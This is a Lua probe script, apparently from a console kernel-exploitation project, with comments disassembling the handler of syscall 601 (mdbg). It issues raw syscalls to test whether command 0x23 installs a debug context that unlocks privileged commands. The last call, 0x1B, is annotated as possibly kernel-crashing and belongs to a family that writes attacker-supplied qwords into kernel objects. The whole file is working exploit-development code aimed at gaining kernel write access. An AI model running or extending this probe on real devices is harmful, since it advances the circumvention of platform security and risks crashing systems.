-- CRASH_CLASS: MODERATE -- one call at the end (0x1B) belongs to the family that writes
-- caller-supplied qwords into a kernel object; if its context slot is populated it can kill.
-- The state-changing call (0x23) and every comparison rung are measured in the corpus as
-- non-lethal, and each prints before it runs.
-- PROBE 1539a: does 0x23 install the mdbg context, and does that unlock the EPERM commands?
--
-- Context. 1538b swept every safe 601 command with `{1, 3, <mapped name>}` at arg3 = 3 and with
-- the corpus shape arg3 = 0, and reported only commands whose answer changed:
--
--   0x15  len3 EINVAL(22)      vs len0 EPERM(1)
--   0x1F  len3 EPERM(1)        vs len0 EFAULT(14)
--   0x23  len3 0               vs len0 EINVAL(22)     <-- the one the length gate predicts
--
-- 0x23's own [D] rung then told the rest of the story:
--
--   0x23 {1,3,name} arg3=3   -> 0
--   0x23 {1,3,name} arg3=15  -> -1 EPERM(1)
--   0x23 {1,4,name} arg3=3   -> 0
--
-- Same three qwords, same zeroed tail; the only difference is how many qwords were copied, and
-- beyond index 2 they are all zero. A content-dependent check therefore cannot explain the flip.
-- A *state*-dependent one can, and the 13.60 body says exactly that. The case at 0x8b6611ce:
--
--   ca11e5  bzero(local, 0x78)
--   ca11ea  lea rax,[r12-0x10] / cmp rax,-0xe / jb fail     ; arg3 in [2,15]
--   ca1227  copyin(r15, local, arg3*8)
--   ca1245  cmp local[0],1 / lea rcx,[local[1]-3] / cmp rcx,2 / setb / and
--   ca125c  jne fail                                         ; needs local[0]==1, local[1] in {3,4}
--   ca1270  edi=0x1000 / call malloc                         ; a 0x1000 name buffer
--   ca12b6  copyinstr(local[2], buf, 0x1000, &len)           ; the user name, NUL-terminated
--   ca1c60  malloc(len) / bcopy / free(the 0x1000 buffer)
--   ca1caa  call 0x8b65afc0                                  ; <-- the mdbg CONTEXT CREATOR
--   ca1ce8  r15 = local[1] - 1 / cmp r15,3 / ja fail         ; four sub-cases, table at 0x8e4111xx
--   ca1d0b  cmp dword [ctx+0x170],0 / mov r14d,1 / jne fail  ; EPERM(1) if already stamped
--   ca1d25  mov ecx,[td+0x9c] / mov [ctx+0x170],ecx          ; ctx[0x170] = this thread's TID
--
-- So the third call in 1538b's [D] met the stamp that the first call had just written, and the
-- EPERM is the stamp refusing a second registration - not a rejection of arg3 = 15. Which means
-- 0x23 is an install: it creates the per-process mdbg context (0x8b65afc0, the same creator the
-- attach body calls at ca12e3) and records the calling TID in it.
--
-- Why that matters. `docs/SYS601_SECOND_STAGE_14_10.md` closed the write family with "the
-- context is installed only by attach, and attach needs a blob we cannot supply". If 0x23
-- installs it instead, that premise is gone: `[proc+0x568]` becomes non-NULL for a game process,
-- and every command that dereferences it - 0x0A, 0x0F, 0x18 answered EPERM(1) in 1538b, the
-- signature of a NULL-context check - may change its answer.
--
-- The measurement is therefore a BEFORE/AFTER table on the same process: the same eight commands
-- with the same shape, once with no context and once with 0x23's context installed. A command
-- that moves from EPERM(1) to 0 has found the context. The install is proved twice: by its own
-- rv, and by the stamp refusing a repeat.
--
-- 0x1B runs last and alone. Its case at 0x8b662013 does `rax = [[proc+0x568]+0xf0]`, and the only
-- writer of that slot stores a 0 or 1 flag, so the expected answer is the `return 3` at the
-- `test rax,rax / je`, not a write - but that expectation is what this rung tests, and it is the
-- only call here that can die.
--
-- -- prior art:
--   results/phase36_realargs/1538b_sys601_length_owner_sweep_20261110_154233.txt (0x23 len3=0 vs len0=EINVAL; [D] EPERM on the repeat)
--   results/phase17_new_vectors/1193a_601_errno_map.lua (the pre-install EPERM(1) set: 0x0A, 0x0F, 0x18)
--   docs/MDBG_601_COMMAND_MAP_14_10.md (the attach body at 0x8b6612d5 and the ctx creator 0x8b65afc0)
--   docs/SYS601_SECOND_STAGE_14_10.md (the write family at 0x8b662013 and its ctx[0xf0] gate)
--   results/kernel_handlers/asm/sys_601_deep.asm (flat listing at base 0x8a9c0000; the case is ca11ce)

print("=== PROBE 1539a: DOES 0x23 INSTALL THE MDBG CONTEXT ===")
print("")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
local ok_sig = 0
for _, s in ipairs({5, 6, 7, 8, 12, 24, 25, 26, 30, 31}) do
    local o = pcall(function() return mk(416)(uint64(s), uint64(N(sa)), uint64(0)) end)
    if o then ok_sig = ok_sig + 1 end
end
print(string.format("[0] SIG_IGN installed on %d/10 signals", ok_sig))

local page = memory.alloc(0x1000)
pcall(function() memory.write_byte(page, uint64(120)) end)
pcall(function() memory.write_byte(page + 1, uint64(0)) end)
print(string.format("[0] name page at 0x%X", N(page)))

local sc601 = mk(601)
local S = memory.alloc(0x100)
local function setup(q1)
    for i = 0, 0xFC, 4 do memory.write_dword(S + i, 0) end
    if q1 then
        memory.write_qword(S + 0x00, uint64(1))
        memory.write_qword(S + 0x08, uint64(q1))
        memory.write_qword(S + 0x10, uint64(N(page)))
    end
end

local function call(tag, cmd, nq)
    print(string.format("  %-26s 601(0x%02X, buf, %d) ...", tag, cmd, nq))
    local ok, r = pcall(function() return sc601(uint64(cmd), uint64(N(S)), uint64(nq), uint64(0), uint64(0), uint64(0)) end)
    if not ok then print("       rv=PCALL-FAIL") return -999, "pcall" end
    local v = N(r)
    local e = (v == -1) and es() or ""
    print(string.format("       rv=%s %s", tostring(v), e))
    return v, e
end

local watch = { 0x0A, 0x0F, 0x18, 0x15, 0x1F, 0x1C, 0x1E, 0x21 }
local before = {}

print("")
print("[A] BEFORE any install: the same eight commands, all with {1,3,name} at arg3 = 3")
for _, c in ipairs(watch) do
    setup(3)
    local v, e = call(string.format("0x%02X pre-install", c), c, 3)
    before[c] = { v = v, e = e }
end

print("")
print("[B] install: 0x23 with the length shape")
setup(3)
local vi, ei = call("0x23 install q1=3", 0x23, 3)

print("")
print("[C] the stamp refuses a second registration (this is the state oracle)")
setup(3)
local vr, er = call("0x23 repeat q1=3", 0x23, 3)

print("")
print("[D] the other accepted mode, twice")
setup(4)
local v4a = call("0x23 q1=4 first", 0x23, 3)
setup(4)
local v4b = call("0x23 q1=4 second", 0x23, 3)

print("")
print("[E] AFTER: the same eight commands, same shape")
local changed = {}
for _, c in ipairs(watch) do
    setup(3)
    local v, e = call(string.format("0x%02X post-install", c), c, 3)
    local b = before[c]
    local same = (b.v == v) and (b.e == e)
    print(string.format("     compare 0x%02X: pre=%s (%s) post=%s (%s) -> %s",
        c, tostring(b.v), b.e, tostring(v), e, same and "same" or "CHANGED"))
    if not same then changed[#changed+1] = c end
end

print("")
print("[F] verdict")
print(string.format("  install 0x23 q1=3      rv=%s %s", tostring(vi), ei))
print(string.format("  repeat 0x23 q1=3       rv=%s %s", tostring(vr), er))
if #changed == 0 then
    print("  no watched command changed after the install")
else
    local names = {}
    for _, c in ipairs(changed) do names[#names+1] = string.format("0x%02X", c) end
    print("  CHANGED after install: " .. table.concat(names, " "))
end
if vr == -1 and er:find("not permitted") then
    print("  the repeat hitting EPERM is the strongest single indicator that ctx[0x170] holds a TID")
end

print("")
print("[G] last, because it needs the context slot that the install just created: 0x1B")
setup(3)
call("0x1B with ctx present", 0x1B, 3)

print("")
print(string.format("=== PROBE 1539a COMPLETE pid=%s ===", tostring(PID)))
